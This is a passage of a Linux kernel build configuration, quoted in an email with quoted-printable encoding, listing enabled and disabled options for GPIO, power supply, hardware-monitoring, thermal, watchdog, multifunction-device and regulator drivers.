> # CONFIG_PTP_1588_CLOCK_IDTCM is not set
> # CONFIG_PTP_1588_CLOCK_FC3W is not set
> # CONFIG_PTP_1588_CLOCK_MOCK is not set
> # CONFIG_PTP_1588_CLOCK_VMW is not set
> # CONFIG_PTP_1588_CLOCK_OCP is not set
> # CONFIG_PTP_NETC_V4_TIMER is not set
> # end of PTP clock support
>=20
> #
> # DPLL device support
> #
> # CONFIG_ZL3073X_I2C is not set
> # CONFIG_ZL3073X_SPI is not set
> # end of DPLL device support
>=20
> # CONFIG_PINCTRL is not set
> CONFIG_GPIOLIB_LEGACY=3Dy
> CONFIG_GPIOLIB=3Dy
> CONFIG_GPIOLIB_FASTPATH_LIMIT=3D512
> CONFIG_OF_GPIO=3Dy
> CONFIG_GPIO_ACPI=3Dy
> CONFIG_GPIOLIB_IRQCHIP=3Dy
> # CONFIG_DEBUG_GPIO is not set
> # CONFIG_GPIO_SYSFS is not set
> # CONFIG_GPIO_CDEV is not set
>=20
> #
> # Memory mapped GPIO drivers
> #
> # CONFIG_GPIO_74XX_MMIO is not set
> # CONFIG_GPIO_ALTERA is not set
> # CONFIG_GPIO_AMDPT is not set
> # CONFIG_GPIO_CADENCE is not set
> # CONFIG_GPIO_DWAPB is not set
> # CONFIG_GPIO_FTGPIO010 is not set
> # CONFIG_GPIO_GENERIC_PLATFORM is not set
> # CONFIG_GPIO_GRANITERAPIDS is not set
> # CONFIG_GPIO_GRGPIO is not set
> # CONFIG_GPIO_HLWD is not set
> # CONFIG_GPIO_ICH is not set
> # CONFIG_GPIO_LOGICVC is not set
> # CONFIG_GPIO_MB86S7X is not set
> # CONFIG_GPIO_POLARFIRE_SOC is not set
> # CONFIG_GPIO_SIFIVE is not set
> # CONFIG_GPIO_SYSCON is not set
> # CONFIG_GPIO_XILINX is not set
> # CONFIG_GPIO_AMD_FCH is not set
> # end of Memory mapped GPIO drivers
>=20
> #
> # Port-mapped I/O GPIO drivers
> #
> # CONFIG_GPIO_VX855 is not set
> # CONFIG_GPIO_F7188X is not set
> # CONFIG_GPIO_IT87 is not set
> # CONFIG_GPIO_SCH311X is not set
> # CONFIG_GPIO_WINBOND is not set
> # CONFIG_GPIO_WS16C48 is not set
> # end of Port-mapped I/O GPIO drivers
>=20
> #
> # I2C GPIO expanders
> #
> # CONFIG_GPIO_ADNP is not set
> # CONFIG_GPIO_FXL6408 is not set
> # CONFIG_GPIO_DS4520 is not set
> # CONFIG_GPIO_GW_PLD is not set
> # CONFIG_GPIO_MAX7300 is not set
> # CONFIG_GPIO_MAX732X is not set
> # CONFIG_GPIO_PCA953X is not set
> # CONFIG_GPIO_PCA9570 is not set
> # CONFIG_GPIO_PCF857X is not set
> # CONFIG_GPIO_TPIC2810 is not set
> # end of I2C GPIO expanders
>=20
> #
> # MFD GPIO expanders
> #
> CONFIG_GPIO_DLN2=3Dy
> CONFIG_GPIO_LJCA=3Dy
> # CONFIG_GPIO_TWL4030 is not set
> # CONFIG_GPIO_WHISKEY_COVE is not set
> # end of MFD GPIO expanders
>=20
> #
> # PCI GPIO expanders
> #
> # CONFIG_GPIO_AMD8111 is not set
> # CONFIG_GPIO_BT8XX is not set
> # CONFIG_GPIO_ML_IOH is not set
> # CONFIG_GPIO_PCI_IDIO_16 is not set
> # CONFIG_GPIO_PCIE_IDIO_24 is not set
> # CONFIG_GPIO_RDC321X is not set
> # CONFIG_GPIO_SODAVILLE is not set
> # end of PCI GPIO expanders
>=20
> #
> # SPI GPIO expanders
> #
> # CONFIG_GPIO_74X164 is not set
> # CONFIG_GPIO_MAX3191X is not set
> # CONFIG_GPIO_MAX7301 is not set
> # CONFIG_GPIO_MC33880 is not set
> # CONFIG_GPIO_PISOSR is not set
> # CONFIG_GPIO_XRA1403 is not set
> # end of SPI GPIO expanders
>=20
> #
> # USB GPIO expanders
> #
> CONFIG_GPIO_VIPERBOARD=3Dy
> # CONFIG_GPIO_MPSSE is not set
> # end of USB GPIO expanders
>=20
> #
> # Virtual GPIO drivers
> #
> # CONFIG_GPIO_AGGREGATOR is not set
> # CONFIG_GPIO_LATCH is not set
> # CONFIG_GPIO_LINE_MUX is not set
> # CONFIG_GPIO_MOCKUP is not set
> # CONFIG_GPIO_VIRTIO is not set
> # CONFIG_GPIO_SIM is not set
> # end of Virtual GPIO drivers
>=20
> #
> # GPIO Debugging utilities
> #
> # CONFIG_GPIO_SLOPPY_LOGIC_ANALYZER is not set
> # CONFIG_GPIO_VIRTUSER is not set
> # end of GPIO Debugging utilities
>=20
> # CONFIG_W1 is not set
> # CONFIG_POWER_RESET is not set
> # CONFIG_POWER_SEQUENCING is not set
> CONFIG_POWER_SUPPLY=3Dy
> # CONFIG_POWER_SUPPLY_DEBUG is not set
> CONFIG_POWER_SUPPLY_HWMON=3Dy
> # CONFIG_GENERIC_ADC_BATTERY is not set
> # CONFIG_IP5XXX_POWER is not set
> # CONFIG_TEST_POWER is not set
> # CONFIG_CHARGER_ADP5061 is not set
> # CONFIG_BATTERY_CHAGALL is not set
> # CONFIG_BATTERY_CW2015 is not set
> # CONFIG_BATTERY_DS2780 is not set
> # CONFIG_BATTERY_DS2781 is not set
> # CONFIG_BATTERY_DS2782 is not set
> # CONFIG_BATTERY_SAMSUNG_SDI is not set
> # CONFIG_BATTERY_SBS is not set
> # CONFIG_CHARGER_SBS is not set
> # CONFIG_MANAGER_SBS is not set
> # CONFIG_BATTERY_BQ27XXX is not set
> # CONFIG_BATTERY_MAX17040 is not set
> # CONFIG_BATTERY_MAX17042 is not set
> # CONFIG_BATTERY_MAX1720X is not set
> CONFIG_CHARGER_ISP1704=3Dy
> # CONFIG_CHARGER_MAX8903 is not set
> # CONFIG_CHARGER_TWL4030 is not set
> # CONFIG_CHARGER_TWL6030 is not set
> # CONFIG_CHARGER_LP8727 is not set
> # CONFIG_CHARGER_GPIO is not set
> # CONFIG_CHARGER_MANAGER is not set
> # CONFIG_CHARGER_LT3651 is not set
> # CONFIG_CHARGER_LTC4162L is not set
> # CONFIG_CHARGER_DETECTOR_MAX14656 is not set
> # CONFIG_CHARGER_MAX77976 is not set
> # CONFIG_CHARGER_MAX8971 is not set
> # CONFIG_CHARGER_MT6360 is not set
> # CONFIG_CHARGER_MT6370 is not set
> # CONFIG_CHARGER_BQ2415X is not set
> CONFIG_CHARGER_BQ24190=3Dy
> # CONFIG_CHARGER_BQ24257 is not set
> # CONFIG_CHARGER_BQ24735 is not set
> # CONFIG_CHARGER_BQ2515X is not set
> # CONFIG_CHARGER_BQ25890 is not set
> # CONFIG_CHARGER_BQ25980 is not set
> # CONFIG_CHARGER_BQ256XX is not set
> # CONFIG_CHARGER_SMB347 is not set
> # CONFIG_BATTERY_GAUGE_LTC2941 is not set
> # CONFIG_BATTERY_GOLDFISH is not set
> # CONFIG_BATTERY_RT5033 is not set
> # CONFIG_CHARGER_RT9455 is not set
> # CONFIG_CHARGER_RT9467 is not set
> # CONFIG_CHARGER_RT9471 is not set
> # CONFIG_CHARGER_RT9756 is not set
> # CONFIG_FUEL_GAUGE_STC3117 is not set
> # CONFIG_CHARGER_UCS1002 is not set
> # CONFIG_CHARGER_BD99954 is not set
> # CONFIG_BATTERY_SURFACE is not set
> # CONFIG_CHARGER_SURFACE is not set
> # CONFIG_BATTERY_UG3105 is not set
> # CONFIG_FUEL_GAUGE_MM8013 is not set
> CONFIG_HWMON=3Dy
> # CONFIG_HWMON_DEBUG_CHIP is not set
>=20
> #
> # Native drivers
> #
> # CONFIG_SENSORS_ABITUGURU is not set
> # CONFIG_SENSORS_ABITUGURU3 is not set
> # CONFIG_SENSORS_AD7314 is not set
> # CONFIG_SENSORS_AD7414 is not set
> # CONFIG_SENSORS_AD7418 is not set
> # CONFIG_SENSORS_ADM1025 is not set
> # CONFIG_SENSORS_ADM1026 is not set
> # CONFIG_SENSORS_ADM1029 is not set
> # CONFIG_SENSORS_ADM1031 is not set
> # CONFIG_SENSORS_ADM1177 is not set
> # CONFIG_SENSORS_ADM9240 is not set
> # CONFIG_SENSORS_ADT7310 is not set
> # CONFIG_SENSORS_ADT7410 is not set
> # CONFIG_SENSORS_ADT7411 is not set
> # CONFIG_SENSORS_ADT7462 is not set
> # CONFIG_SENSORS_ADT7470 is not set
> # CONFIG_SENSORS_ADT7475 is not set
> # CONFIG_SENSORS_AHT10 is not set
> CONFIG_SENSORS_AQUACOMPUTER_D5NEXT=3Dy
> # CONFIG_SENSORS_AS370 is not set
> # CONFIG_SENSORS_ASC7621 is not set
> # CONFIG_SENSORS_ASUS_ROG_RYUJIN is not set
> # CONFIG_SENSORS_AXI_FAN_CONTROL is not set
> # CONFIG_SENSORS_K8TEMP is not set
> # CONFIG_SENSORS_K10TEMP is not set
> # CONFIG_SENSORS_FAM15H_POWER is not set
> # CONFIG_SENSORS_APPLESMC is not set
> # CONFIG_SENSORS_ASB100 is not set
> # CONFIG_SENSORS_ATXP1 is not set
> # CONFIG_SENSORS_CHIPCAP2 is not set
> CONFIG_SENSORS_CORSAIR_CPRO=3Dy
> CONFIG_SENSORS_CORSAIR_PSU=3Dy
> # CONFIG_SENSORS_DRIVETEMP is not set
> # CONFIG_SENSORS_DS620 is not set
> # CONFIG_SENSORS_DS1621 is not set
> # CONFIG_SENSORS_DELL_SMM is not set
> # CONFIG_SENSORS_I5K_AMB is not set
> # CONFIG_SENSORS_F71805F is not set
> # CONFIG_SENSORS_F71882FG is not set
> # CONFIG_SENSORS_F75375S is not set
> # CONFIG_SENSORS_FSCHMD is not set
> # CONFIG_SENSORS_FTSTEUTATES is not set
> CONFIG_SENSORS_GIGABYTE_WATERFORCE=3Dy
> # CONFIG_SENSORS_GL518SM is not set
> # CONFIG_SENSORS_GL520SM is not set
> # CONFIG_SENSORS_GPD is not set
> # CONFIG_SENSORS_G760A is not set
> # CONFIG_SENSORS_G762 is not set
> # CONFIG_SENSORS_GPIO_FAN is not set
> # CONFIG_SENSORS_HIH6130 is not set
> # CONFIG_SENSORS_HS3001 is not set
> # CONFIG_SENSORS_HTU31 is not set
> # CONFIG_SENSORS_IIO_HWMON is not set
> # CONFIG_SENSORS_I5500 is not set
> # CONFIG_SENSORS_CORETEMP is not set
> # CONFIG_SENSORS_ISL28022 is not set
> # CONFIG_SENSORS_IT87 is not set
> # CONFIG_SENSORS_JC42 is not set
> CONFIG_SENSORS_POWERZ=3Dy
> # CONFIG_SENSORS_POWR1220 is not set
> # CONFIG_SENSORS_LENOVO_EC is not set
> # CONFIG_SENSORS_LINEAGE is not set
> # CONFIG_SENSORS_LTC2945 is not set
> # CONFIG_SENSORS_LTC2947_I2C is not set
> # CONFIG_SENSORS_LTC2947_SPI is not set
> # CONFIG_SENSORS_LTC2990 is not set
> # CONFIG_SENSORS_LTC2991 is not set
> # CONFIG_SENSORS_LTC2992 is not set
> # CONFIG_SENSORS_LTC4151 is not set
> # CONFIG_SENSORS_LTC4215 is not set
> # CONFIG_SENSORS_LTC4222 is not set
> # CONFIG_SENSORS_LTC4245 is not set
> # CONFIG_SENSORS_LTC4260 is not set
> # CONFIG_SENSORS_LTC4261 is not set
> # CONFIG_SENSORS_LTC4282 is not set
> # CONFIG_SENSORS_MAX1111 is not set
> # CONFIG_SENSORS_MAX127 is not set
> # CONFIG_SENSORS_MAX16065 is not set
> # CONFIG_SENSORS_MAX1619 is not set
> # CONFIG_SENSORS_MAX1668 is not set
> # CONFIG_SENSORS_MAX197 is not set
> # CONFIG_SENSORS_MAX31722 is not set
> # CONFIG_SENSORS_MAX31730 is not set
> # CONFIG_SENSORS_MAX31760 is not set
> # CONFIG_MAX31827 is not set
> # CONFIG_SENSORS_MAX6620 is not set
> # CONFIG_SENSORS_MAX6621 is not set
> # CONFIG_SENSORS_MAX6639 is not set
> # CONFIG_SENSORS_MAX6650 is not set
> # CONFIG_SENSORS_MAX6697 is not set
> # CONFIG_SENSORS_MAX31790 is not set
> # CONFIG_SENSORS_MC34VR500 is not set
> # CONFIG_SENSORS_MCP3021 is not set
> # CONFIG_SENSORS_TC654 is not set
> # CONFIG_SENSORS_TPS23861 is not set
> # CONFIG_SENSORS_MR75203 is not set
> # CONFIG_SENSORS_ADCXX is not set
> # CONFIG_SENSORS_LM63 is not set
> # CONFIG_SENSORS_LM70 is not set
> # CONFIG_SENSORS_LM73 is not set
> # CONFIG_SENSORS_LM75 is not set
> # CONFIG_SENSORS_LM77 is not set
> # CONFIG_SENSORS_LM78 is not set
> # CONFIG_SENSORS_LM80 is not set
> # CONFIG_SENSORS_LM83 is not set
> # CONFIG_SENSORS_LM85 is not set
> # CONFIG_SENSORS_LM87 is not set
> # CONFIG_SENSORS_LM90 is not set
> # CONFIG_SENSORS_LM92 is not set
> # CONFIG_SENSORS_LM93 is not set
> # CONFIG_SENSORS_LM95234 is not set
> # CONFIG_SENSORS_LM95241 is not set
> # CONFIG_SENSORS_LM95245 is not set
> # CONFIG_SENSORS_PC87360 is not set
> # CONFIG_SENSORS_PC87427 is not set
> # CONFIG_SENSORS_NTC_THERMISTOR is not set
> # CONFIG_SENSORS_NCT6683 is not set
> # CONFIG_SENSORS_NCT6775 is not set
> # CONFIG_SENSORS_NCT6775_I2C is not set
> # CONFIG_SENSORS_NCT7363 is not set
> # CONFIG_SENSORS_NCT7802 is not set
> # CONFIG_SENSORS_NCT7904 is not set
> # CONFIG_SENSORS_NPCM7XX is not set
> CONFIG_SENSORS_NZXT_KRAKEN2=3Dy
> # CONFIG_SENSORS_NZXT_KRAKEN3 is not set
> CONFIG_SENSORS_NZXT_SMART2=3Dy
> # CONFIG_SENSORS_OCC_P8_I2C is not set
> # CONFIG_SENSORS_PCF8591 is not set
> # CONFIG_PMBUS is not set
> # CONFIG_SENSORS_PT5161L is not set
> # CONFIG_SENSORS_SBTSI is not set
> # CONFIG_SENSORS_SHT15 is not set
> # CONFIG_SENSORS_SHT21 is not set
> # CONFIG_SENSORS_SHT3x is not set
> # CONFIG_SENSORS_SHT4x is not set
> # CONFIG_SENSORS_SHTC1 is not set
> # CONFIG_SENSORS_SIS5595 is not set
> # CONFIG_SENSORS_DME1737 is not set
> # CONFIG_SENSORS_EMC1403 is not set
> # CONFIG_SENSORS_EMC2103 is not set
> # CONFIG_SENSORS_EMC2305 is not set
> # CONFIG_SENSORS_EMC6W201 is not set
> # CONFIG_SENSORS_SMSC47M1 is not set
> # CONFIG_SENSORS_SMSC47M192 is not set
> # CONFIG_SENSORS_SMSC47B397 is not set
> # CONFIG_SENSORS_SCH5627 is not set
> # CONFIG_SENSORS_SCH5636 is not set
> # CONFIG_SENSORS_STTS751 is not set
> # CONFIG_SENSORS_SURFACE_FAN is not set
> # CONFIG_SENSORS_SURFACE_TEMP is not set
> # CONFIG_SENSORS_ADC128D818 is not set
> # CONFIG_SENSORS_ADS7828 is not set
> # CONFIG_SENSORS_ADS7871 is not set
> # CONFIG_SENSORS_AMC6821 is not set
> # CONFIG_SENSORS_INA209 is not set
> # CONFIG_SENSORS_INA2XX is not set
> # CONFIG_SENSORS_INA238 is not set
> # CONFIG_SENSORS_INA3221 is not set
> # CONFIG_SENSORS_SPD5118 is not set
> # CONFIG_SENSORS_TC74 is not set
> # CONFIG_SENSORS_THMC50 is not set
> # CONFIG_SENSORS_TMP102 is not set
> # CONFIG_SENSORS_TMP103 is not set
> # CONFIG_SENSORS_TMP108 is not set
> # CONFIG_SENSORS_TMP401 is not set
> # CONFIG_SENSORS_TMP421 is not set
> # CONFIG_SENSORS_TMP464 is not set
> # CONFIG_SENSORS_TMP513 is not set
> # CONFIG_SENSORS_TSC1641 is not set
> # CONFIG_SENSORS_VIA_CPUTEMP is not set
> # CONFIG_SENSORS_VIA686A is not set
> # CONFIG_SENSORS_VT1211 is not set
> # CONFIG_SENSORS_VT8231 is not set
> # CONFIG_SENSORS_W83773G is not set
> # CONFIG_SENSORS_W83781D is not set
> # CONFIG_SENSORS_W83791D is not set
> # CONFIG_SENSORS_W83792D is not set
> # CONFIG_SENSORS_W83793 is not set
> # CONFIG_SENSORS_W83795 is not set
> # CONFIG_SENSORS_W83L785TS is not set
> # CONFIG_SENSORS_W83L786NG is not set
> # CONFIG_SENSORS_W83627HF is not set
> # CONFIG_SENSORS_W83627EHF is not set
> # CONFIG_SENSORS_XGENE is not set
>=20
> #
> # ACPI drivers
> #
> # CONFIG_SENSORS_ACPI_POWER is not set
> # CONFIG_SENSORS_ATK0110 is not set
> # CONFIG_SENSORS_ASUS_WMI is not set
> # CONFIG_SENSORS_ASUS_EC is not set
> # CONFIG_SENSORS_HP_WMI is not set
> CONFIG_THERMAL=3Dy
> CONFIG_THERMAL_NETLINK=3Dy
> # CONFIG_THERMAL_STATISTICS is not set
> # CONFIG_THERMAL_DEBUGFS is not set
> # CONFIG_THERMAL_CORE_TESTING is not set
> CONFIG_THERMAL_EMERGENCY_POWEROFF_DELAY_MS=3D0
> CONFIG_THERMAL_HWMON=3Dy
> # CONFIG_THERMAL_OF is not set
> CONFIG_THERMAL_DEFAULT_GOV_STEP_WISE=3Dy
> # CONFIG_THERMAL_DEFAULT_GOV_FAIR_SHARE is not set
> # CONFIG_THERMAL_DEFAULT_GOV_USER_SPACE is not set
> # CONFIG_THERMAL_GOV_FAIR_SHARE is not set
> CONFIG_THERMAL_GOV_STEP_WISE=3Dy
> # CONFIG_THERMAL_GOV_BANG_BANG is not set
> # CONFIG_THERMAL_GOV_USER_SPACE is not set
> # CONFIG_PCIE_THERMAL is not set
> # CONFIG_THERMAL_EMULATION is not set
> # CONFIG_THERMAL_MMIO is not set
>=20
> #
> # Intel thermal drivers
> #
> # CONFIG_INTEL_POWERCLAMP is not set
> CONFIG_X86_THERMAL_VECTOR=3Dy
> # CONFIG_X86_PKG_TEMP_THERMAL is not set
> # CONFIG_INTEL_SOC_DTS_THERMAL is not set
>=20
> #
> # ACPI INT340X thermal drivers
> #
> # CONFIG_INT340X_THERMAL is not set
> # end of ACPI INT340X thermal drivers
>=20
> # CONFIG_INTEL_BXT_PMIC_THERMAL is not set
> # CONFIG_INTEL_PCH_THERMAL is not set
> # CONFIG_INTEL_TCC_COOLING is not set
> # CONFIG_INTEL_HFI_THERMAL is not set
> # end of Intel thermal drivers
>=20
> # CONFIG_GENERIC_ADC_THERMAL is not set
> CONFIG_WATCHDOG=3Dy
> # CONFIG_WATCHDOG_CORE is not set
> # CONFIG_WATCHDOG_NOWAYOUT is not set
> CONFIG_WATCHDOG_HANDLE_BOOT_ENABLED=3Dy
> CONFIG_WATCHDOG_OPEN_TIMEOUT=3D0
> # CONFIG_WATCHDOG_SYSFS is not set
> # CONFIG_WATCHDOG_HRTIMER_PRETIMEOUT is not set
>=20
> #
> # Watchdog Pretimeout Governors
> #
>=20
> #
> # Watchdog Device Drivers
> #
> # CONFIG_SOFT_WATCHDOG is not set
> # CONFIG_GPIO_WATCHDOG is not set
> # CONFIG_LENOVO_SE10_WDT is not set
> # CONFIG_LENOVO_SE30_WDT is not set
> # CONFIG_WDAT_WDT is not set
> # CONFIG_XILINX_WATCHDOG is not set
> # CONFIG_ZIIRAVE_WATCHDOG is not set
> # CONFIG_CADENCE_WATCHDOG is not set
> # CONFIG_DW_WATCHDOG is not set
> # CONFIG_TWL4030_WATCHDOG is not set
> # CONFIG_MAX63XX_WATCHDOG is not set
> # CONFIG_RETU_WATCHDOG is not set
> # CONFIG_ACQUIRE_WDT is not set
> # CONFIG_ADVANTECH_WDT is not set
> # CONFIG_ADVANTECH_EC_WDT is not set
> # CONFIG_ALIM1535_WDT is not set
> # CONFIG_ALIM7101_WDT is not set
> # CONFIG_EBC_C384_WDT is not set
> # CONFIG_EXAR_WDT is not set
> # CONFIG_F71808E_WDT is not set
> # CONFIG_SP5100_TCO is not set
> # CONFIG_SBC_FITPC2_WATCHDOG is not set
> # CONFIG_EUROTECH_WDT is not set
> # CONFIG_IB700_WDT is not set
> # CONFIG_IBMASR is not set
> # CONFIG_WAFER_WDT is not set
> # CONFIG_I6300ESB_WDT is not set
> # CONFIG_IE6XX_WDT is not set
> # CONFIG_INTEL_OC_WATCHDOG is not set
> # CONFIG_ITCO_WDT is not set
> # CONFIG_IT8712F_WDT is not set
> # CONFIG_IT87_WDT is not set
> # CONFIG_HP_WATCHDOG is not set
> # CONFIG_SC1200_WDT is not set
> # CONFIG_PC87413_WDT is not set
> # CONFIG_NV_TCO is not set
> # CONFIG_60XX_WDT is not set
> # CONFIG_SMSC_SCH311X_WDT is not set
> # CONFIG_SMSC37B787_WDT is not set
> # CONFIG_TQMX86_WDT is not set
> # CONFIG_VIA_WDT is not set
> # CONFIG_W83627HF_WDT is not set
> # CONFIG_W83877F_WDT is not set
> # CONFIG_W83977F_WDT is not set
> # CONFIG_MACHZ_WDT is not set
> # CONFIG_SBC_EPX_C3_WATCHDOG is not set
> # CONFIG_INTEL_MEI_WDT is not set
> # CONFIG_NI903X_WDT is not set
> # CONFIG_NIC7018_WDT is not set
> # CONFIG_MEN_A21_WDT is not set
>=20
> #
> # PCI-based Watchdog Cards
> #
> # CONFIG_PCIPCWATCHDOG is not set
> # CONFIG_WDTPCI is not set
>=20
> #
> # USB-based Watchdog Cards
> #
> CONFIG_USBPCWATCHDOG=3Dy
> CONFIG_SSB_POSSIBLE=3Dy
> CONFIG_SSB=3Dy
> CONFIG_SSB_PCIHOST_POSSIBLE=3Dy
> # CONFIG_SSB_PCIHOST is not set
> CONFIG_SSB_PCMCIAHOST_POSSIBLE=3Dy
> # CONFIG_SSB_PCMCIAHOST is not set
> CONFIG_SSB_SDIOHOST_POSSIBLE=3Dy
> # CONFIG_SSB_SDIOHOST is not set
> # CONFIG_SSB_DRIVER_GPIO is not set
> CONFIG_BCMA_POSSIBLE=3Dy
> CONFIG_BCMA=3Dy
> CONFIG_BCMA_HOST_PCI_POSSIBLE=3Dy
> # CONFIG_BCMA_HOST_PCI is not set
> # CONFIG_BCMA_HOST_SOC is not set
> # CONFIG_BCMA_DRIVER_PCI is not set
> # CONFIG_BCMA_DRIVER_GMAC_CMN is not set
> # CONFIG_BCMA_DRIVER_GPIO is not set
> # CONFIG_BCMA_DEBUG is not set
>=20
> #
> # Multifunction device drivers
> #
> CONFIG_MFD_CORE=3Dy
> # CONFIG_MFD_ADP5585 is not set
> # CONFIG_MFD_ACT8945A is not set
> # CONFIG_MFD_AS3711 is not set
> # CONFIG_MFD_SMPRO is not set
> # CONFIG_MFD_AS3722 is not set
> # CONFIG_PMIC_ADP5520 is not set
> # CONFIG_MFD_AAT2870_CORE is not set
> # CONFIG_MFD_ATMEL_FLEXCOM is not set
> # CONFIG_MFD_ATMEL_HLCDC is not set
> # CONFIG_MFD_BCM590XX is not set
> # CONFIG_MFD_BD9571MWV is not set
> # CONFIG_MFD_AXP20X_I2C is not set
> # CONFIG_MFD_CGBC is not set
> # CONFIG_MFD_CS40L50_I2C is not set
> # CONFIG_MFD_CS40L50_SPI is not set
> # CONFIG_MFD_CS42L43_I2C is not set
> # CONFIG_MFD_CS42L43_SDW is not set
> # CONFIG_MFD_LOCHNAGAR is not set
> # CONFIG_MFD_MADERA is not set
> # CONFIG_PMIC_DA903X is not set
> # CONFIG_MFD_DA9052_SPI is not set
> # CONFIG_MFD_DA9052_I2C is not set
> # CONFIG_MFD_DA9055 is not set
> # CONFIG_MFD_DA9062 is not set
> # CONFIG_MFD_DA9063 is not set
> # CONFIG_MFD_DA9150 is not set
> CONFIG_MFD_DLN2=3Dy
> # CONFIG_MFD_GATEWORKS_GSC is not set
> # CONFIG_MFD_MC13XXX_SPI is not set
> # CONFIG_MFD_MC13XXX_I2C is not set
> # CONFIG_MFD_MP2629 is not set
> # CONFIG_MFD_PF1550 is not set
> # CONFIG_MFD_HI6421_PMIC is not set
> # CONFIG_MFD_INTEL_QUARK_I2C_GPIO is not set
> CONFIG_LPC_ICH=3Dy
> # CONFIG_LPC_SCH is not set
> # CONFIG_INTEL_SOC_PMIC is not set
> CONFIG_INTEL_SOC_PMIC_BXTWC=3Dy
> CONFIG_INTEL_SOC_PMIC_CHTWC=3Dy
> # CONFIG_INTEL_SOC_PMIC_CHTDC_TI is not set
> # CONFIG_MFD_INTEL_LPSS_ACPI is not set
> # CONFIG_MFD_INTEL_LPSS_PCI is not set
> CONFIG_MFD_INTEL_PMC_BXT=3Dy
> # CONFIG_MFD_IQS62X is not set
> # CONFIG_MFD_JANZ_CMODIO is not set
> # CONFIG_MFD_KEMPLD is not set
> # CONFIG_MFD_88PM800 is not set
> # CONFIG_MFD_88PM805 is not set
> # CONFIG_MFD_88PM860X is not set
> # CONFIG_MFD_88PM886_PMIC is not set
> # CONFIG_MFD_MAX5970 is not set
> # CONFIG_MFD_MAX14577 is not set
> # CONFIG_MFD_MAX77541 is not set
> # CONFIG_MFD_MAX77620 is not set
> # CONFIG_MFD_MAX77650 is not set
> # CONFIG_MFD_MAX77686 is not set
> # CONFIG_MFD_MAX77693 is not set
> # CONFIG_MFD_MAX77705 is not set
> # CONFIG_MFD_MAX77714 is not set
> # CONFIG_MFD_MAX77759 is not set
> # CONFIG_MFD_MAX77843 is not set
> # CONFIG_MFD_MAX8907 is not set
> # CONFIG_MFD_MAX8925 is not set
> # CONFIG_MFD_MAX8997 is not set
> # CONFIG_MFD_MAX8998 is not set
> CONFIG_MFD_MT6360=3Dy
> CONFIG_MFD_MT6370=3Dy
> # CONFIG_MFD_MT6397 is not set
> # CONFIG_MFD_MENF21BMC is not set
> # CONFIG_MFD_NCT6694 is not set
> # CONFIG_MFD_OCELOT is not set
> # CONFIG_EZX_PCAP is not set
> # CONFIG_MFD_CPCAP is not set
> CONFIG_MFD_VIPERBOARD=3Dy
> # CONFIG_MFD_NTXEC is not set
> CONFIG_MFD_RETU=3Dy
> # CONFIG_MFD_SY7636A is not set
> # CONFIG_MFD_RDC321X is not set
> # CONFIG_MFD_RT4831 is not set
> # CONFIG_MFD_RT5033 is not set
> # CONFIG_MFD_RT5120 is not set
> # CONFIG_MFD_RC5T583 is not set
> # CONFIG_MFD_RK8XX_I2C is not set
> # CONFIG_MFD_RK8XX_SPI is not set
> # CONFIG_MFD_RN5T618 is not set
> # CONFIG_MFD_SEC_I2C is not set
> # CONFIG_MFD_SI476X_CORE is not set
> # CONFIG_MFD_SM501 is not set
> # CONFIG_MFD_SKY81452 is not set
> # CONFIG_MFD_STMPE is not set
> CONFIG_MFD_SYSCON=3Dy
> # CONFIG_MFD_LP3943 is not set
> # CONFIG_MFD_LP8788 is not set
> # CONFIG_MFD_TI_LMU is not set
> # CONFIG_MFD_BQ257XX is not set
> # CONFIG_MFD_PALMAS is not set
> # CONFIG_TPS6105X is not set
> # CONFIG_TPS65010 is not set
> # CONFIG_TPS6507X is not set
> # CONFIG_MFD_TPS65086 is not set
> # CONFIG_MFD_TPS65090 is not set
> # CONFIG_MFD_TPS65217 is not set
> # CONFIG_MFD_TI_LP873X is not set
> # CONFIG_MFD_TI_LP87565 is not set
> # CONFIG_MFD_TPS65218 is not set
> # CONFIG_MFD_TPS65219 is not set
> # CONFIG_MFD_TPS6586X is not set
> # CONFIG_MFD_TPS65910 is not set
> # CONFIG_MFD_TPS65912_I2C is not set
> # CONFIG_MFD_TPS65912_SPI is not set
> # CONFIG_MFD_TPS6594_I2C is not set
> # CONFIG_MFD_TPS6594_SPI is not set
> CONFIG_TWL4030_CORE=3Dy
> # CONFIG_MFD_TWL4030_AUDIO is not set
> # CONFIG_TWL6040_CORE is not set
> # CONFIG_MFD_LM3533 is not set
> # CONFIG_MFD_TC3589X is not set
> # CONFIG_MFD_TQMX86 is not set
> # CONFIG_MFD_VX855 is not set
> # CONFIG_MFD_ARIZONA_I2C is not set
> # CONFIG_MFD_ARIZONA_SPI is not set
> # CONFIG_MFD_WM8400 is not set
> # CONFIG_MFD_WM831X_I2C is not set
> # CONFIG_MFD_WM831X_SPI is not set
> # CONFIG_MFD_WM8350_I2C is not set
> # CONFIG_MFD_WM8994 is not set
> # CONFIG_MFD_ROHM_BD718XX is not set
> # CONFIG_MFD_ROHM_BD71828 is not set
> # CONFIG_MFD_ROHM_BD957XMUF is not set
> # CONFIG_MFD_ROHM_BD96801 is not set
> # CONFIG_MFD_STPMIC1 is not set
> # CONFIG_MFD_STMFX is not set
> # CONFIG_MFD_ATC260X_I2C is not set
> # CONFIG_MFD_QCOM_PM8008 is not set
> # CONFIG_RAVE_SP_CORE is not set
> # CONFIG_MFD_INTEL_M10_BMC_SPI is not set
> # CONFIG_MFD_QNAP_MCU is not set
> # CONFIG_MFD_RSMU_I2C is not set
> # CONFIG_MFD_RSMU_SPI is not set
> # CONFIG_MFD_UPBOARD_FPGA is not set
> # CONFIG_MFD_MAX7360 is not set
> # end of Multifunction device drivers
>=20
> CONFIG_REGULATOR=3Dy
> # CONFIG_REGULATOR_DEBUG is not set
> CONFIG_REGULATOR_FIXED_VOLTAGE=3Dy
> # CONFIG_REGULATOR_VIRTUAL_CONSUMER is not set
> # CONFIG_REGULATOR_USERSPACE_CONSUMER is not set
> # CONFIG_REGULATOR_NETLINK_EVENTS is not set
> # CONFIG_REGULATOR_88PG86X is not set
> # CONFIG_REGULATOR_ACT8865 is not set
> # CONFIG_REGULATOR_AD5398 is not set
> # CONFIG_REGULATOR_ADP5055 is not set
> # CONFIG_REGULATOR_AW37503 is not set
> # CONFIG_REGULATOR_DA9121 is not set
> # CONFIG_REGULATOR_DA9210 is not set
> # CONFIG_REGULATOR_DA9211 is not set
> # CONFIG_REGULATOR_FAN53555 is not set
> # CONFIG_REGULATOR_FAN53880 is not set
> # CONFIG_REGULATOR_GPIO is not set
> # CONFIG_REGULATOR_ISL9305 is not set
> # CONFIG_REGULATOR_ISL6271A is not set
> # CONFIG_REGULATOR_FP9931 is not set
> # CONFIG_REGULATOR_LP3971 is not set
